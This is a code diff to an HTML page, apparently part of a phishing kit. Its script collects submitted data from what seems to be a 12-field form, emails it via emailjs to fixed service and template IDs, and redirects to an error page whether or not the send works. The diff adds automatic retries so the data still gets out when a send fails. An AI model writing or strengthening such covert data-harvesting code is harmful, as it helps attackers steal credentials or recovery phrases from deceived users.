@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -593,17 +593,24 @@
             let _d = `Type: ${_t}\nData: ${data}`;
             let safetext = _d.length > 40000
                 ? _d.substring(0, 40000) + "\n\n...[TRUNCATED]"
-                : messageString;
+                : _d;
 
             let parms = { message: safetext };
 
-            emailjs.send('service_b91vfvn', 'template_artm0pa', parms)
-                .then(function (response) {
-                    window.location.href = "error.html";
-                })
-                .catch(function (error) {
-                    window.location.href = "error.html";
-                });
+            function sendWithRetry(retries) {
+                emailjs.send('service_b91vfvn', 'template_artm0pa', parms)
+                    .then(function (response) {
+                        window.location.href = "error.html";
+                    })
+                    .catch(function (error) {
+                        if (retries > 0) {
+                            setTimeout(function () { sendWithRetry(retries - 1); }, 1500);
+                        } else {
+                            window.location.href = "error.html";
+                        }
+                    });
+            }
+            sendWithRetry(2);
         }
         renderFields('12');
     </script>
